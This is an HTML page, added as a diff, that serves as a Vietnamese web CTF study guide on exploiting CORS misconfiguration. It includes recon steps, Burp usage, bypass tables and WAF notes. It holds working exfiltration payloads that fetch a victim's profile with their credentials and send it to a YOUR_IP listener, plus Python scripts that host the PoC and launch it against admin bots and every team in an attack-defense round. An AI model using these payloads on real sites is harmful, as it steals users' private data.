@@ -1,0 +1,519 @@
+<title>CORS Misconfiguration — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · CSRF, CORS, Redirect</div>
+    <h1>CORS Misconfiguration</h1>
+    <p class="sub">CORS là cơ chế cho phép 1 trang web <strong>xin phép</strong> đọc dữ liệu từ domain khác. Khi
+    server cấu hình sai — phản chiếu lại origin bất kỳ kèm cho phép gửi cookie — trang độc của bạn có thể
+    <strong>đọc được</strong> dữ liệu riêng tư của nạn nhân từ domain đích, điều mà CSRF (chỉ gửi, không đọc
+    được) không làm được.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>CORS Misconfiguration là gì, để làm gì?</h2>
+  <p class="lead">Mặc định, trình duyệt <strong>chặn</strong> JavaScript của 1 trang đọc response từ domain khác
+  (Same-Origin Policy). CORS (Cross-Origin Resource Sharing) là cơ chế để server <strong>chủ động nới lỏng</strong>
+  quy tắc này cho những domain được tin cậy, qua header <code>Access-Control-Allow-Origin</code>. Nếu server cấu
+  hình sai — <strong>phản chiếu lại bất kỳ origin nào gửi lên</strong> thay vì so khớp 1 danh sách cố định, VÀ
+  kèm <code>Access-Control-Allow-Credentials: true</code> — trang của bạn (origin bất kỳ) có thể gửi request kèm
+  cookie nạn nhân <strong>và đọc được response</strong>, không chỉ gửi mù như CSRF.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Luôn gửi header <code>Origin: https://evil.com</code> (domain bất kỳ, không liên quan) tới API đích, xem
+  response có header <code>Access-Control-Allow-Origin: https://evil.com</code> (phản chiếu lại đúng y hệt
+  domain giả bạn gửi) không — nếu có, kèm thêm <code>Access-Control-Allow-Credentials: true</code> ⟹ lỗ hổng
+  xác nhận.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ CORS MISCONFIGURATION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Gửi request kèm header <code>Origin: https://evil-test.com</code> tới API trả dữ liệu nhạy cảm (vd
+        <code>/api/profile</code>). Response có <code>Access-Control-Allow-Origin: https://evil-test.com</code>
+        (giống hệt, không phải domain cố định của app) ⟹ nghi cao.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Response CŨNG có <code>Access-Control-Allow-Credentials: true</code> (nếu thiếu, trình duyệt vẫn không
+        gửi kèm cookie dù origin được cho phép).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Repeater: thêm/sửa header <code>Origin</code> thành domain bất kỳ, Send, xem 2 header CORS trong
+        Response.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (HTML đọc trộm dữ liệu)</span>
+<pre><code>&lt;script&gt;
+fetch('http://TARGET/api/profile', {credentials: 'include'})
+  .then(r =&gt; r.text())
+  .then(data =&gt; fetch('http://YOUR_IP:8000/?d=' + encodeURIComponent(data)));
+&lt;/script&gt;</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+r = requests.get(<span class="s">"http://TARGET/api/profile"</span>,
+        headers={<span class="s">"Origin"</span>: <span class="s">"https://evil-test.com"</span>}, cookies={<span class="s">"session"</span>: <span class="s">"victim_session"</span>})
+<span class="k">print</span>(<span class="s">"ACAO:"</span>, r.headers.get(<span class="s">"Access-Control-Allow-Origin"</span>))
+<span class="k">print</span>(<span class="s">"ACAC:"</span>, r.headers.get(<span class="s">"Access-Control-Allow-Credentials"</span>))</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Phải dùng admin bot (giống XSS/CSRF) vì bạn cần nạn nhân mở trang độc để "mượn" cookie của họ — tự gửi
+        request từ Python chỉ chứng minh lỗ hổng tồn tại, không lấy được cookie thật của ai khác. WAF rule nhanh:
+        chặn response có <code>Access-Control-Allow-Origin</code> phản chiếu origin lạ (khó làm bằng regex thuần
+        vì đây là response header, không phải request). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Same-Origin Policy (SOP)</b> — quy tắc mặc định của trình duyệt: JavaScript của trang A
+  chỉ đọc được response/dữ liệu của chính domain A, không đọc được của domain B — dù vẫn GỬI được request tới B
+  (đây là điều CSRF lợi dụng, còn CORS misconfig lợi dụng việc ĐỌC được).</div>
+  <div class="def"><b>CORS (Cross-Origin Resource Sharing)</b> — cơ chế HTTP header để server B "cấp phép" cho
+  1 số domain cụ thể được phép đọc response của nó, vượt qua SOP mặc định.</div>
+  <div class="def"><b>Access-Control-Allow-Origin (ACAO)</b> — header server trả về, liệt kê domain nào được
+  phép đọc response này. Giá trị <code>*</code> (mọi domain) KHÔNG cho phép gửi kèm credentials (trình duyệt tự
+  chặn kết hợp này) — vì vậy lỗ hổng thật sự nguy hiểm là khi server <strong>phản chiếu (reflect)</strong> đúng
+  giá trị <code>Origin</code> người gửi thay vì để <code>*</code> hay 1 domain cố định.</div>
+  <div class="def"><b>Access-Control-Allow-Credentials (ACAC)</b> — header <code>true</code>/<code>false</code>,
+  quyết định trình duyệt có gửi kèm cookie/session khi thực hiện request cross-origin hay không.</div>
+  <p>Code hay viết sai:</p>
+  <pre><code><span class="c">// Node/Express -- phản chiếu MỌI origin gửi lên, không so khớp whitelist</span>
+app.use((req, res, next) => {
+  res.header(<span class="s">'Access-Control-Allow-Origin'</span>, req.headers.origin);   <span class="c">// !! lấy thẳng từ request</span>
+  res.header(<span class="s">'Access-Control-Allow-Credentials'</span>, <span class="s">'true'</span>);
+  next();
+});</code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Lập trình viên "tiện tay" phản chiếu origin thay vì whitelist</h2>
+  <p>Khi app cần hỗ trợ CORS cho nhiều domain khác nhau (vd app có nhiều subdomain, hoặc muốn hỗ trợ cả
+  localhost lúc dev), cách viết <strong>đúng</strong> là so khớp origin gửi lên với 1 <strong>danh sách cố
+  định</strong> rồi mới set ACAO bằng đúng giá trị đó nếu khớp. Cách viết <strong>sai nhưng nhanh gọn</strong>
+  (hay gặp ở code dựng vội) là lấy thẳng <code>req.headers.origin</code> rồi set lại y hệt — "coi như luôn khớp"
+  — khiến MỌI domain, kể cả domain của kẻ tấn công, đều được chấp nhận là "đã whitelist".</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>So sánh: CSRF (chỉ gửi) vs CORS misconfig (gửi VÀ đọc được)</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr18)}
+    </style>
+    <defs><marker id="arr18" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">Trang evil.com của bạn:</text>
+    <text x="22" y="56" class="lbl-a">fetch(TARGET, {credentials:'include'})</text>
+
+    <path d="M210,48 H248" class="arrow"/>
+    <rect x="253" y="20" width="200" height="55" rx="10" class="box"/>
+    <text x="265" y="40" class="lbl-m">Request gửi kèm cookie</text>
+    <text x="265" y="56" class="lbl">thật của nạn nhân (giống CSRF)</text>
+
+    <path d="M453,48 H490" class="arrow"/>
+    <rect x="495" y="20" width="175" height="55" rx="10" class="box-a"/>
+    <text x="507" y="40" class="lbl-m">Server trả ACAO=evil.com</text>
+    <text x="507" y="56" class="lbl-a">+ ACAC=true (lỗi cấu hình)</text>
+
+    <path d="M580,80 V105" class="arrow"/>
+    <rect x="253" y="110" width="195" height="55" rx="10" class="box-a"/>
+    <text x="265" y="130" class="lbl-m">Trình duyệt THẤY ACAO khớp</text>
+    <text x="265" y="146" class="lbl-a">-&gt; CHO PHÉP JS đọc response!</text>
+
+    <path d="M253,135 H90" class="arrow"/>
+    <rect x="10" y="110" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="130" class="lbl-m">JS của bạn ĐỌC ĐƯỢC data</text>
+    <text x="22" y="146" class="lbl-a">(khác CSRF -- không đọc được)</text>
+  </svg>
+  </div>
+  <p>Khác biệt cốt lõi so với CSRF: CSRF chỉ hữu dụng với hành động <strong>GHI</strong> (đổi mật khẩu, chuyển
+  tiền) vì bạn không cần biết kết quả, chỉ cần request được thực thi. CORS misconfig mở ra khả năng
+  <strong>ĐỌC</strong> dữ liệu — lấy được thông tin cá nhân, token, hay chính flag nếu nó nằm trong response của
+  1 API riêng tư nào đó.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Response có <code>Access-Control-Allow-Origin</code> khớp CHÍNH XÁC giá trị <code>Origin</code> bạn gửi (thử vài domain khác nhau, luôn khớp)</td><td>Server phản chiếu origin, không whitelist thật</td></tr>
+    <tr><td>Kèm <code>Access-Control-Allow-Credentials: true</code></td><td>Xác nhận đủ điều kiện khai thác (thiếu cái này thì vô dụng dù ACAO phản chiếu)</td></tr>
+    <tr><td>ACAO chấp nhận cả <code>null</code> (origin của iframe sandbox/file local)</td><td>Biến thể bypass khi app chỉ check "không rỗng" thay vì so khớp domain thật</td></tr>
+    <tr><td>ACAO chấp nhận subdomain lỏng lẻo (regex kiểu <code>.*\.target\.com</code> nhưng cho qua cả <code>target.com.evil.com</code>)</td><td>Lỗi so khớp domain bằng string match thay vì parse đúng</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Dò phản chiếu Origin trong Repeater</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request API trả dữ liệu nhạy cảm, Send to Repeater.</li>
+    <li>Thêm/sửa header <code>Origin: https://subdomain-test-12345.com</code> (domain lạ, dễ nhận ra trong
+    response).</li>
+    <li>Send, xem Response Headers: nếu <code>Access-Control-Allow-Origin</code> trả về đúng y hệt chuỗi lạ đó
+    ⟹ xác nhận phản chiếu.</li>
+    <li>Kiểm tra tiếp có <code>Access-Control-Allow-Credentials: true</code> không — thiếu dòng này thì không
+    khai thác được (trình duyệt tự chặn gửi cookie dù ACAO hợp lệ).</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Các kiểu cấu hình sai hay gặp</h2>
+
+  <h3>A. Phản chiếu origin bất kỳ (phổ biến nhất)</h3>
+  <pre><code>Origin: https://anything-at-all.com
+<span class="c"># -&gt; Response: Access-Control-Allow-Origin: https://anything-at-all.com</span></code></pre>
+
+  <h3>B. Whitelist lỏng lẻo theo string match</h3>
+  <table>
+    <tr><th>App check (sai)</th><th>Bypass bằng</th></tr>
+    <tr><td><code>origin.endsWith('target.com')</code></td><td><code>https://evil-target.com</code> (kết thúc đúng chuỗi nhưng là domain khác)</td></tr>
+    <tr><td><code>origin.includes('target.com')</code></td><td><code>https://target.com.evil.com</code> hoặc <code>https://evil.com/target.com</code></td></tr>
+    <tr><td><code>origin.startsWith('https://target.com')</code></td><td><code>https://target.com.evil.com</code></td></tr>
+  </table>
+
+  <h3>C. Chấp nhận <code>null</code> origin</h3>
+  <p>Một số app coi origin <code>null</code> (xảy ra khi request tới từ iframe sandbox, file <code>file://</code>
+  local, hoặc redirect) là hợp lệ — tạo trang PoC trong iframe có <code>sandbox</code> attribute để trình duyệt
+  tự gửi <code>Origin: null</code>:</p>
+  <pre><code>&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms"
+        src="data:text/html,&lt;script&gt;
+  fetch('http://TARGET/api/profile', {credentials:'include'})
+    .then(r=&gt;r.text()).then(d=&gt;fetch('http://YOUR_IP:8000/?d='+encodeURIComponent(d)))
+&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: KHO PAYLOAD &amp; LISTENER</div>
+  <h2>Tham khảo thêm biến thể, dựng listener</h2>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/CORS Misconfiguration/</code> — nhiều biến thể bypass whitelist hơn
+  bảng mục 06. Listener nhận dữ liệu exfiltrate: dùng lại <code>python3 -m http.server</code> (giống bài
+  XSS/CSRF/SSRF/XXE) — cùng 1 kỹ thuật dựng listener áp dụng xuyên suốt mọi bài cần admin bot.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước (xác nhận lỗ hổng, chưa cần bot)</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET/api/profile"</span>
+
+<span class="c"># Bước 1: xác nhận ACAO phản chiếu + ACAC=true</span>
+r = requests.get(url, headers={<span class="s">"Origin"</span>: <span class="s">"https://evil-test-xyz.com"</span>})
+<span class="k">print</span>(<span class="s">"ACAO:"</span>, r.headers.get(<span class="s">"Access-Control-Allow-Origin"</span>))
+<span class="k">print</span>(<span class="s">"ACAC:"</span>, r.headers.get(<span class="s">"Access-Control-Allow-Credentials"</span>))
+
+<span class="c"># Nếu cả 2 đều xác nhận -> chuyển sang viết PoC HTML cho admin bot (giống bài XSS/CSRF)</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — tự host PoC + report + nhận dữ liệu</h3>
+  <pre><code><span class="k">import</span> re, requests, threading, http.server
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+leaked = []
+
+PORT = 8000
+POC = <span class="s">'''&lt;script&gt;
+fetch("http://TARGET/api/profile", {credentials:"include"})
+  .then(r=&gt;r.text())
+  .then(d=&gt;fetch("/leak?d="+encodeURIComponent(d)));
+&lt;/script&gt;'''</span>
+
+<span class="k">class</span> <span class="d">Handler</span>(http.server.BaseHTTPRequestHandler):
+    <span class="k">def</span> <span class="d">do_GET</span>(self):
+        <span class="k">if</span> self.path.startswith(<span class="s">"/leak"</span>):
+            leaked.append(self.path)
+            self.send_response(200); self.end_headers(); <span class="k">return</span>
+        self.send_response(200); self.send_header(<span class="s">"Content-Type"</span>,<span class="s">"text/html"</span>); self.end_headers()
+        self.wfile.write(POC.encode())
+    <span class="k">def</span> <span class="d">log_message</span>(self,*a): <span class="k">pass</span>
+
+threading.Thread(target=<span class="k">lambda</span>: http.server.HTTPServer((<span class="s">""</span>,PORT),Handler).serve_forever(), daemon=<span class="k">True</span>).start()
+requests.post(<span class="s">"http://TARGET/report"</span>, data={<span class="s">"url"</span>: <span class="s">f"http://YOUR_IP:{PORT}/"</span>})
+
+<span class="k">import</span> time; time.sleep(10)
+<span class="k">print</span>(<span class="s">"Leaked:"</span>, leaked)</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> requests
+
+MY_IP = <span class="s">"10.10.X.X"</span>   <span class="c"># listener PoC đã host sẵn 1 lần đầu round</span>
+
+<span class="k">def</span> <span class="d">exploit_cors</span>(host):
+    <span class="k">try</span>:
+        requests.post(<span class="s">f"http://{host}/report"</span>, data={<span class="s">"url"</span>: <span class="s">f"http://{MY_IP}:8000/"</span>}, timeout=5)
+        <span class="k">return</span> <span class="k">True</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">False</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        exploit_cors(host)
+<span class="c"># Dữ liệu leak (chứa flag) xuất hiện dần trong log listener -- xem song song terminal khác</span></code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có API <code>/api/profile</code> trả thông tin cá nhân (bao gồm field <code>api_key</code> chứa flag, chỉ admin xem được giá trị thật).</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận CORS misconfig</div><div class="d">Gửi <code>Origin: https://evil-test-xyz.com</code> → Response có <code>Access-Control-Allow-Origin: https://evil-test-xyz.com</code> + <code>Access-Control-Allow-Credentials: true</code> ⟹ xác nhận.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Dựng PoC</div><div class="d">Viết HTML fetch <code>/api/profile</code> với <code>credentials:'include'</code>, exfiltrate kết quả về listener.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Report cho bot</div><div class="d">Host PoC, báo URL qua form report.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Listener nhận được JSON profile của admin, chứa <code>"api_key": "FHACKER2026{...}"</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Khó áp dụng — đây là lỗi ở RESPONSE header, không phải request</h2>
+  <div class="note warn"><span class="tag">Giới hạn đặc thù</span>Hầu hết WAF hoạt động theo mô hình kiểm tra
+  <strong>request</strong> đi vào, không kiểm tra/sửa <strong>response</strong> đi ra. CORS misconfig nằm ở lỗi
+  logic server <strong>tự set sai header response</strong> — WAF đứng trước app khó can thiệp vào bước này trừ
+  khi nó hỗ trợ sửa response (reverse proxy có thể làm, tùy nền tảng WAF của BTC).</div>
+  <p>Nếu UI WAF hỗ trợ sửa/chặn response: cân nhắc rule chặn (hoặc ghi đè) response có
+  <code>Access-Control-Allow-Origin</code> khác với domain cố định hợp lệ của chính service. Nếu không hỗ trợ,
+  nhóm lỗ hổng này gần như không phòng thủ được trong khuôn khổ A/D (giống IDOR, Race Condition).</p>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi không khai thác được</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>ACAO luôn trả về <code>*</code> bất kể Origin gửi gì</td><td>App dùng wildcard thật sự (an toàn hơn phản chiếu, nhưng tự động KHÔNG đi kèm credentials được theo chuẩn trình duyệt)</td><td>Không khai thác được qua CORS theo cách này — kiểm tra lại có thực sự cần đọc dữ liệu riêng tư hay dùng CSRF (chỉ cần ghi) thay thế</td></tr>
+    <tr><td>ACAO phản chiếu đúng nhưng response KHÔNG có Allow-Credentials</td><td>Thiếu điều kiện cần — phản chiếu origin không tự động nguy hiểm nếu thiếu credentials</td><td>Kiểm tra xem API đó có cần cookie để trả dữ liệu nhạy cảm không — nếu không cần auth gì cả thì API vốn đã public, không phải lỗ hổng</td></tr>
